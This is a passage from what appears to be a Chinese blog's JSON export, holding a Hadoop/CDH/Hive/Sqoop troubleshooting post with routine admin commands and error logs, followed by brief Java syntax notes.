partition_params          |</span><br><span class=\"line\">| partitions                |</span><br><span class=\"line\">| role_map                  |</span><br><span class=\"line\">| roles                     |</span><br><span class=\"line\">| sd_params                 |</span><br><span class=\"line\">| sds                       |</span><br><span class=\"line\">| sequence_table            |</span><br><span class=\"line\">| serde_params              |</span><br><span class=\"line\">| serdes                    |</span><br><span class=\"line\">| skewed_col_names          |</span><br><span class=\"line\">| skewed_col_value_loc_map  |</span><br><span class=\"line\">| skewed_string_list        |</span><br><span class=\"line\">| skewed_string_list_values |</span><br><span class=\"line\">| skewed_values             |</span><br><span class=\"line\">| sort_cols                 |</span><br><span class=\"line\">| tab_col_stats             |</span><br><span class=\"line\">| table_params              |</span><br><span class=\"line\">| tbl_col_privs             |</span><br><span class=\"line\">| tbl_privs                 |</span><br><span class=\"line\">| tbls                      |</span><br><span class=\"line\">| txn_components            |</span><br><span class=\"line\">| txns                      |</span><br><span class=\"line\">| type_fields               |</span><br><span class=\"line\">| types                     |</span><br><span class=\"line\">| version                   |</span><br><span class=\"line\">+---------------------------+</span><br></pre></td></tr></table></figure></p>\n<p>4.终极解决方案</p>\n<p>重新安装hive，元数据库改名为hive2或者其他什么名字</p>\n<ul>\n<li><h4 id=\"sqoop-缺少驱动\"><a href=\"#sqoop-缺少驱动\" class=\"headerlink\" title=\"sqoop : 缺少驱动\"></a>sqoop : 缺少驱动</h4>报错：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The Network Adapter could not establish the connection</span><br><span class=\"line\">No columns to generate for ClassWriter</span><br><span class=\"line\">Could not load db driver class: com.mysql.jdbc.Driver</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>解决办法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://central.maven.org/maven2/mysql/mysql-connector-java/5.1.45/mysql-connector-java-5.1.45.jar</span><br><span class=\"line\">cp mysql-connector-java-5.1.35-bin.jar /opt/cloudera/parcels/CDH-5.0.2-1.cdh5.0.2.p0.13/lib/sqoop/lib/</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"CDH交换内存异常\"><a href=\"#CDH交换内存异常\" class=\"headerlink\" title=\"CDH交换内存异常\"></a>CDH交换内存异常</h4></li>\n</ul>\n<p>关闭系统交换区</p>\n<p>立即生效</p>\n<pre><code>swapoff –a\n</code></pre><p>建议永久关闭</p>\n<pre><code>sysctl vm.swappiness=0\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"Name-node-is-in-safe-mode\"><a href=\"#Name-node-is-in-safe-mode\" class=\"headerlink\" title=\"Name node is in safe mode\"></a>Name node is in safe mode</h4><p>这是因为在分布式文件系统启动的时候，开始的时候会有安全模式，当分布式文件系统处于安全模式的情况下，文件系统中的内容不允许修改也不允许删除，直到安全模式结束。安全模式主要是为了系统启动的时候检查各个DataNode上数据块的有效性，同时根据策略必要的复制或者删除部分数据块。运行期通过命令也可以进入安全模式。在实践过程中，系统启动的时候去修改和删除文件也会有安全模式不允许修改的出错提示，只需要等待一会儿即可。</p>\n</li>\n</ul>\n<p>可以通过以下命令来手动离开安全模式：</p>\n<pre><code>hdfs dfsadmin -safemode leave  \n</code></pre><ul>\n<li><h4 id=\"内存分配不合理\"><a href=\"#内存分配不合理\" class=\"headerlink\" title=\"内存分配不合理\"></a>内存分配不合理</h4></li>\n</ul>\n<p>表现<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2017-12-14 18:32:32,336 ERROR [Thread-52] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Could not deallocate container for task attemptId attempt_1513247318192_0014_r_000008_0</span><br><span class=\"line\"></span><br><span class=\"line\">2017-12-14 19:20:22,161 ERROR [RMCommunicator Allocator] org.apache.hadoop.mapreduce.v2.app.rm.RMContainerAllocator: Container complete event for unknown container id container_1513249512179_0014_01_000064</span><br></pre></td></tr></table></figure></p>\n<p>解决办法</p>\n<p>修改map，reduce内存和堆栈内存</p>\n<p>可能是因为设置大了，也可能是因为设置小了。要根据机器配置修改</p>\n<p>保证为map 和reduce分配内存的时候不会超过节点的内存<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yarn.nodemanager.resource.memory-mb=2G</span><br><span class=\"line\">yarn.scheduler.maximum-allocation-mb=4G</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"时钟不同步\"><a href=\"#时钟不同步\" class=\"headerlink\" title=\"时钟不同步\"></a>时钟不同步</h4>各种报错<br>安装ntp<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install ntp</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>配置ntp<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">restrict default ignore   //默认不允许修改或者查询ntp,并且不接收特殊封包</span><br><span class=\"line\">restrict 127.0.0.1        //给于本机所有权限</span><br><span class=\"line\">restrict 192.168.56.0 mask 255.255.255.0 notrap nomodify  //给于局域网机的机器有同步时间的权限</span><br><span class=\"line\">server  192.168.56.121     # local clock</span><br><span class=\"line\">driftfile /var/lib/ntp/drift</span><br><span class=\"line\">fudge   127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure></p>\n<p>启动 ntp：</p>\n<pre><code>service ntpd start\n</code></pre><p>设置开机启动:</p>\n<pre><code>chkconfig ntpd on\n</code></pre><ul>\n<li><h4 id=\"hdfs块丢失\"><a href=\"#hdfs块丢失\" class=\"headerlink\" title=\"hdfs块丢失\"></a>hdfs块丢失</h4></li>\n</ul>\n<p>1、首先退出hdfs namenode safe mode<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">hadoop dfsadmin -safemode leave</span><br></pre></td></tr></table></figure></p>\n<p>2、修复hdfs丢失的块</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hadoop fsck /</span><br><span class=\"line\"></span><br><span class=\"line\">hdfs fsck  /  -delete //此方式会将丢失的块全部删除</span><br></pre></td></tr></table></figure>\n<ul>\n<li><h4 id=\"HDFS-块副本数不足\"><a href=\"#HDFS-块副本数不足\" class=\"headerlink\" title=\"HDFS 块副本数不足\"></a>HDFS 块副本数不足</h4><blockquote>\n<p>块</p>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>在HDFS中，文件是以块（block）的形式存储的，而HDFS的设计初衷也是用来处理大文件的，使用抽象块正好可以满足这一需求。具体来说，比如一个很大的文件，在单一的节点上存储是不可能的，HDFS使用逻辑块的方式将这个很大的文件分成很多块，分别存储在各个节点机器上，从而实现了大文件的存储。<br>    使用抽象块作为操作的单元，方便了存储系统的管理，具体来说，就是把文件块放在DataNode上存储，把文件的元数据信息放到NameNode上管理。<br>    最后，通过给块设置副本，可以实现容错机制。</p>\n</blockquote>\n<p>1.设置副本数</p>\n<p>cdh界面选择hdfs,选择配置设置</p>\n<pre><code>dfs.replication=datanode的数量\n</code></pre><p>2.修改之前的副本数</p>\n<pre><code>hadoop fs -setrep -R 【1中设置的副本数】/\n</code></pre><ul>\n<li><h4 id=\"hive崩溃\"><a href=\"#hive崩溃\" class=\"headerlink\" title=\"hive崩溃\"></a>hive崩溃</h4></li>\n</ul>\n<p>报错：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@hs01 hive]# hive</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0</span><br><span class=\"line\">2017-12-20 14:31:54,793 WARN  [main] mapreduce.TableMapReduceUtil: The hbase-prefix-tree module jar containing PrefixTreeCodec is not present.  Continuing without it.</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=512M; support was removed in 8.0</span><br><span class=\"line\"></span><br><span class=\"line\">Logging initialized using configuration in jar:file:/opt/cloudera/parcels/CDH-5.7.1-1.cdh5.7.1.p0.11/jars/hive-common-1.1.0-cdh5.7.1.jar!/hive-log4j.properties</span><br><span class=\"line\">Exception in thread &quot;main&quot; java.lang.RuntimeException: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:540)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:689)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:628)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class=\"line\">\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class=\"line\">\tat org.apache.hadoop.util.RunJar.run(RunJar.java:221)</span><br><span class=\"line\">\tat org.apache.hadoop.util.RunJar.main(RunJar.java:136)</span><br><span class=\"line\">Caused by: java.lang.RuntimeException: Unable to instantiate org.apache.hadoop.hive.ql.metadata.SessionHiveMetaStoreClient</span><br><span class=\"line\">\tat org.apache.hadoop.hive.metastore.MetaStoreUtils.newInstance(MetaStoreUtils.java:1493)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.&lt;init&gt;(RetryingMetaStoreClient.java:67)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.metastore.RetryingMetaStoreClient.getProxy(RetryingMetaStoreClient.java:82)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.metadata.Hive.createMetaStoreClient(Hive.java:2935)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.metadata.Hive.getMSC(Hive.java:2954)</span><br><span class=\"line\">\tat org.apache.hadoop.hive.ql.session.SessionState.start(SessionState.java:513)</span><br><span class=\"line\">\t... 8 more</span><br></pre></td></tr></table></figure></p>\n<p>解决办法</p>\n<p>Can you please follow below steps and share the result?.</p>\n<ol>\n<li><p>Find out the node which hosting hive metastore service, you can use ambari to figure out the ip/hostname for that node.</p>\n</li>\n<li><p>ssh root login to that hive metastore node and execute below commands.</p>\n</li>\n</ol>\n<p>bash# ps -aef|grep -i org.apache.hadoop.hive.metastore.HiveMetaStore</p>\n<p>bash# lsof -i:9083</p>\n<ol start=\"3\">\n<li>From some other node try connecting hivemetastore port using telnet.</li>\n</ol>\n<p>bash# telnet <hivemeta server=\"\"> 9083</hivemeta></p>\n<p>If 9083 port is not occupied and ps command doesn’t show any metastore process then please try to restart the hivemestore service from ambari UI and perform same check again.</p>\n<ul>\n<li><h4 id=\"Hive-报错，元数据库找不到\"><a href=\"#Hive-报错，元数据库找不到\" class=\"headerlink\" title=\"Hive 报错，元数据库找不到\"></a>Hive 报错，元数据库找不到</h4></li>\n</ul>\n<p>报错内容<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Query for candidates of org.apache.hadoop.hive.metastore.model.MPartitionColumnStatistics and subclasses resulted in no possible candidates</span><br><span class=\"line\">Required table missing : &quot;`CDS`&quot; in Catalog &quot;&quot; Schema &quot;&quot;. DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable &quot;datanucleus.autoCreateTables&quot;</span><br><span class=\"line\">org.datanucleus.store.rdbms.exceptions.MissingTableException: Required table missing : &quot;`CDS`&quot; in Catalog &quot;&quot; Schema &quot;&quot;. DataNucleus requires this table to perform its persistence operations. Either your MetaData is incorrect, or you need to enable &quot;datanucleus.autoCreateTables&quot;</span><br><span class=\"line\">\tat org.datanucleus.store.rdbms.table.AbstractTable.exists(AbstractTable.java:485)</span><br></pre></td></tr></table></figure></p>\n<p>先检查hive下是否有mysql驱动程序</p>\n<p>解决办法</p>\n<p>1.Go to the $HIVE_HOME and run the initschema option on the schematool:</p>\n<pre><code>bin/schematool -dbType mysql -initSchema\n</code></pre><p>2.修改hive配置，允许自己建表建视图<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">&lt;name&gt;datanucleus.autoCreateTables&lt;/name&gt;</span><br><span class=\"line\">&lt;value&gt;True&lt;/value&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br></pre></td></tr></table></figure></p>\n<p>然后重启</p>\n<p>3.查看查看hive 用到的库，比如mysql中的hive库</p>\n<p>登录mysql</p>\n<pre><code>mysql -uroot -p******\n</code></pre><p>查看表<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use hive;</span><br><span class=\"line\">show tables;</span><br><span class=\"line\">select * from [sometable]</span><br></pre></td></tr></table></figure></p>\n<p>表大致如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| Tables_in_hive            |</span><br><span class=\"line\">+---------------------------+</span><br><span class=\"line\">| bucketing_cols            |</span><br><span class=\"line\">| cds                       |</span><br><span class=\"line\">| columns_v2                |</span><br><span class=\"line\">| compaction_queue          |</span><br><span class=\"line\">| completed_txn_components  |</span><br><span class=\"line\">| database_params           |</span><br><span class=\"line\">| db_privs                  |</span><br><span class=\"line\">| dbs                       |</span><br><span class=\"line\">| delegation_tokens         |</span><br><span class=\"line\">| func_ru                   |</span><br><span class=\"line\">| funcs                     |</span><br><span class=\"line\">| global_privs              |</span><br><span class=\"line\">| hive_locks                |</span><br><span class=\"line\">| idxs                      |</span><br><span class=\"line\">| index_params              |</span><br><span class=\"line\">| master_keys               |</span><br><span class=\"line\">| next_compaction_queue_id  |</span><br><span class=\"line\">| next_lock_id              |</span><br><span class=\"line\">| next_txn_id               |</span><br><span class=\"line\">| notification_log          |</span><br><span class=\"line\">| notification_sequence     |</span><br><span class=\"line\">| nucleus_tables            |</span><br><span class=\"line\">| part_col_privs            |</span><br><span class=\"line\">| part_col_stats            |</span><br><span class=\"line\">| part_privs                |</span><br><span class=\"line\">| partition_events          |</span><br><span class=\"line\">| partition_key_vals        |</span><br><span class=\"line\">| partition_keys            |</span><br><span class=\"line\">| partition_params          |</span><br><span class=\"line\">| partitions                |</span><br><span class=\"line\">| role_map                  |</span><br><span class=\"line\">| roles                     |</span><br><span class=\"line\">| sd_params                 |</span><br><span class=\"line\">| sds                       |</span><br><span class=\"line\">| sequence_table            |</span><br><span class=\"line\">| serde_params              |</span><br><span class=\"line\">| serdes                    |</span><br><span class=\"line\">| skewed_col_names          |</span><br><span class=\"line\">| skewed_col_value_loc_map  |</span><br><span class=\"line\">| skewed_string_list        |</span><br><span class=\"line\">| skewed_string_list_values |</span><br><span class=\"line\">| skewed_values             |</span><br><span class=\"line\">| sort_cols                 |</span><br><span class=\"line\">| tab_col_stats             |</span><br><span class=\"line\">| table_params              |</span><br><span class=\"line\">| tbl_col_privs             |</span><br><span class=\"line\">| tbl_privs                 |</span><br><span class=\"line\">| tbls                      |</span><br><span class=\"line\">| txn_components            |</span><br><span class=\"line\">| txns                      |</span><br><span class=\"line\">| type_fields               |</span><br><span class=\"line\">| types                     |</span><br><span class=\"line\">| version                   |</span><br><span class=\"line\">+---------------------------+</span><br></pre></td></tr></table></figure></p>\n<p>4.终极解决方案</p>\n<p>重新安装hive，元数据库改名为hive2或者其他什么名字</p>\n<ul>\n<li><h4 id=\"sqoop-缺少驱动\"><a href=\"#sqoop-缺少驱动\" class=\"headerlink\" title=\"sqoop : 缺少驱动\"></a>sqoop : 缺少驱动</h4>报错：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The Network Adapter could not establish the connection</span><br><span class=\"line\">No columns to generate for ClassWriter</span><br><span class=\"line\">Could not load db driver class: com.mysql.jdbc.Driver</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>解决办法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://central.maven.org/maven2/mysql/mysql-connector-java/5.1.45/mysql-connector-java-5.1.45.jar</span><br><span class=\"line\">cp mysql-connector-java-5.1.35-bin.jar /opt/cloudera/parcels/CDH-5.0.2-1.cdh5.0.2.p0.13/lib/sqoop/lib/</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"CDH交换内存异常\"><a href=\"#CDH交换内存异常\" class=\"headerlink\" title=\"CDH交换内存异常\"></a>CDH交换内存异常</h4></li>\n</ul>\n<p>关闭系统交换区</p>\n<p>立即生效</p>\n<pre><code>swapoff –a\n</code></pre><p>建议永久关闭</p>\n<pre><code>sysctl vm.swappiness=0\n</code></pre>"},{"title":"JAVA语法","date":"2018-07-10T13:09:19.000Z","_content":"#### 1. if 和 else if\n\n```\nelse if(){}\n```\n如果有满足条件的就会跳出，不执行其他的else if\n```\nif(){}\n```\n会连续判断，直到结束\n#### 2. if else 和 switch\n> if else(){} 的空间效率高\n\n> switch的时间效率高\n==空间换时间==\n\n#### 3.param = new Object()和param = null\n> param = new Object() 会初始化，真实存在\n\n> param = null 参数为空，不存在\n\n#### 4.Variable expected\n[Variable expected error](http://stackoverflow.com/questions/31797631/variable-expected-error)\n\nmap.get(key) = new Value();\n\n#### 5.assert\n[assertion(断言)](http://www.cnblogs.com/wardensky/p/4307848.html)\nassertion就是在程序中的一条语句，它对一个boolean表达式进行检查，一个正确程序必须保证这个boolean表达式的值为true；如果该值为false，说明程序已经处于不正确的状态下，系统将给出警告并且退出。\n\n用法：\n```\n1. assert expression1;\n2. assert expression1: expression2;\n```\nexpression1表示一个boolean表达式，expression2表示一个基本类型、表达式或者是一个Object，用于在失败时输出错误信息。\n\n#### 6.Java修饰符\npublic/private/protected\n\n#### 7.Java 集合类\n\n#### 8. Object o = new Object()\no.toString()和（String）o的区别\n#### 9.Java枚举类\n[lianjie](http://www.cnblogs.com/zhaoyanjun/p/5659811.html)\n\n#### 10.@SuppressWarnings\nJ2SE 提供的最后一个批注是 @SuppressWarnings。该批注的作用是给编译器一条指令，告诉它对被批注的代码元素内部的某些警告保持静默。 \n@SuppressWarnings 批注允许你选择性地取消特定代码段（即，类或方法）中的警告。其中的想法是当您看到警告时，您将调查它，如果你确定它不是问题，就可以添加一个 @SuppressWarnings 批注，以使您不会再看到警告。虽然它听起来似乎会屏蔽潜在的错误，但实际上它将提高代码安全性，因为它将防止对警告无动于衷 — 看到的每一个警告都将值得注意。\n[来自百度知道](https://zhidao.baidu.com/question/297231941.html)\n\n[可屏蔽内容](http://blog.csdn.net/mddy2001/article/details/8291484)","source":"_posts/Java/JAVA语法.md","raw":"---\ntitle: JAVA语法\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n#### 1. if 和 else if\n\n```\nelse if(){}\n```\n如果有满足条件的就会跳出，不执行其他的else if\n```\nif(){}\n```\n会连续判断，直到结束\n#### 2. if else 和 switch\n> if else(){} 的空间效率高\n\n> switch的时间效率高\n==空间换时间==\n\n#### 3.param = new Object()和param = null\n> param = new Object() 会初始化，真实存在\n\n> param = null 参数为空，不存在\n\n#### 4.Variable expected\n[Variable expected error](http://stackoverflow.com/questions/31797631/variable-expected-error)\n\nmap.get(key) = new Value();\n\n#### 5.assert\n[assertion(断言)](http://www.cnblogs.com/wardensky/p/4307848.html)\nassertion就是在程序中的一条语句，它对一个boolean表达式进行检查，一个正确程序必须保证这个boolean表达式的值为true；如果该值为false，说明程序已经处于不正确的状态下，系统将给出警告并且退出。\n\n用法：\n```\n1. assert expression1;\n2. assert expression1: expression2;\n```\nexpression1表示一个boolean表达式，expression2表示一个基本类型、表达式或者是一个Object，用于在失败时输出错误信息。\n\n#### 6.Java修饰符\npublic/private/protected\n\n#### 7.Java 集合类\n\n#### 8. Object o = new Object()\no.toString()和（String）o的区别\n#### 9.Java枚举类\n[lianjie](http://www.cnblogs.com/zhaoyanjun/p/5659811.html)\n\n#### 10.@SuppressWarnings\nJ2SE 提供的最后一个批注是 @SuppressWarnings。该批注的作用是给编译器一条指令，告诉它对被批注的代码元素内部的某些警告保持静默。 \n@SuppressWarnings 批注允许你选择性地取消特定代码段（即，类或方法）中的警告。其中的想法是当您看到警告时，您将调查它，如果你确定它不是问题，就可以添加一个 @SuppressWarnings 批注，以使您不会再看到警告。虽然它听起来似乎会屏蔽潜在的错误，但实际上它将提高代码安全性，因为它将防止对警告无动于衷 — 看到的每一个警告都将值得注意。\n[来自百度知道](https://zhidao.baidu.com/question/297231941.html)\n\n[可屏蔽内容](http://blog.csdn.net/mddy2001/article/details/8291484)","slug":"Java/JAVA语法","published":1,"updated":"2018-07-10T13:10:09.894Z","_id":"cjjedmh9e002i0gtj2fn7np1u","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1-if-和-else-if\"><a href=\"#1-if-和-else-if\" class=\"headerlink\" title=\"1. if 和 else if\"></a>1. if 和 else if</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">else if()&#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>如果有满足条件的就会跳出，不执行其他的else if<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if()&#123;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>会连续判断，直到结束</p>\n<h4 id=\"2-if-else-和-switch\"><a href=\"#2-if-else-和-switch\" class=\"headerlink\" title=\"2. if else 和 switch\"></a>2. if else 和 switch</h4><blockquote>\n<p>if else(){} 的空间效率高</p>\n</blockquote>\n<blockquote>\n<p>switch的时间效率高<br>==空间换时间==</p>\n</blockquote>\n<h4 id=\"3-param-new-Object-和param-null\"><a href=\"#3-param-new-Object-和param-null\" class=\"headerlink\" title=\"3.param = new Object()和param = null\"></a>3.param = new Object()和param = null</h4><blockquote>\n<p>param = new Object() 会初始化，真实存在</p>\n</blockquote>\n<blockquote>\n<p>param = null 参数为空，不存在</p>\n</blockquote>\n<h4 id=\"4-Variable-expected\"><a href=\"#4-Variable-expected\" class=\"headerlink\" title=\"4.Variable expected\"></a>4.Variable expected</h4><p><a href=\"http://stackoverflow.com/questions/31797631/variable-expected-error\" target=\"_blank\" rel=\"noopener\">Variable expected error</a></p>\n<p>map.get(key) = new Value();</p>\n<h4 id=\"5-assert\"><a href=\"#5-assert\" class=\"headerlink\" title=\"5.assert\"></a>5.assert</h4><p><a href=\"http://www.cnblogs.com/wardensky/p/4307848.html\" target=\"_blank\" rel=\"noopener\">assertion(断言)</a><br>assertion就是在程序中的一条语句，它对一个boolean表达式进行检查，一个正确程序必须保证这个boolean表达式的值为true；如果该值为false，说明程序已经处于不正确的状态下，系统将给出警告并且退出。</p>\n<p>用法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. assert expression1;</span><br><span class=\"line\">2. assert expression1: expression2;</span><br></pre></td></tr></table></figure></p>\n<p>expression1表示一个boolean表达式，expression2表示一个基本类型、表达式或者是一个Object，用于在失败时输出错误信息。</p>\n<h4 id=\"6-Java修饰符\"><a href=\"#6-Java修饰符\" class=\"headerlink\" title=\"6.Java修饰符\"></a>6.Java修饰符</h4><p>public/private/protected</p>\n<h4 id=\"7-Java-集合类\"><a href=\"#7-Java-集合类\" class=\"headerlink\" title=\"7.Java 集合类\"></a>7.Java 集合类</h4><h4 id=\"8-Object-o-new-Object\"><a href=\"#8-Object-o-new-Object\" class=\"headerlink\" title=\"8. Object o = new Object()\"></a>8. Object o = new Object()</h4><p>o.toString()和（String）o的区别</p>\n<h4 id=\"9-Java枚举类\"><a href=\"#9-Java枚举类\" class=\"headerlink\" title=\"9.Java枚举类\"></a>9.Java枚举类</h4><p><a href=\"http://www.cnblogs.com/zhaoyanjun/p/5659811.html\" target=\"_blank\" rel=\"noopener\">lianjie</a></p>\n<h4 id=\"10-SuppressWarnings\"><a href=\"#10-SuppressWarnings\" class=\"headerlink\" title=\"10.@SuppressWarnings\"></a>10.@SuppressWarnings</h4><p>J2SE 提供的最后一个批注是 @SuppressWarnings。该批注的作用是给编译器一条指令，告诉它对被批注的代码元素内部的某些警告保持静默。<br>@SuppressWarnings 批注允许你选择性地取消特定代码段（即，类或方法）中的警告。其中的想法是当您看到警告时，您将调查它，如果你确定它不是问题，就可以添加一个 @SuppressWarnings 批注，以使您不会再看到警告。虽然它听起来似乎会屏蔽潜在的错误，但实际上它将提高代码安全性，因为它将防止对警告无动于衷 — 看到的每一个警告都将值得注意。<br><a href=\"https://zhidao.baidu.com/question/297231941.html\" target=\"_blank\" rel=\"noopener\">来自百度知道</a></p>\n<p><a href=\"http://blog.csdn.net/mddy2001/article/details/8291484\" target=\"_blank\" rel=\"noopener\">可屏蔽内容</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-if-和-else-if\"><a href=\"#1-if-和-else-if\" class=\"headerlink\" title=\"1. if 和 else if\"></a>1. if 和 else if</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">else if()&#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>如果有满足条件的就会跳出，不执行其他的else if<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if()&#123;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>会连续判断，直到结束</p>\n<h4 id=\"2-if-else-和-switch\"><a href=\"#2-if-else-和-switch\" class=\"headerlink\" title=\"2. if else 和 switch\"></a>2. if else 和 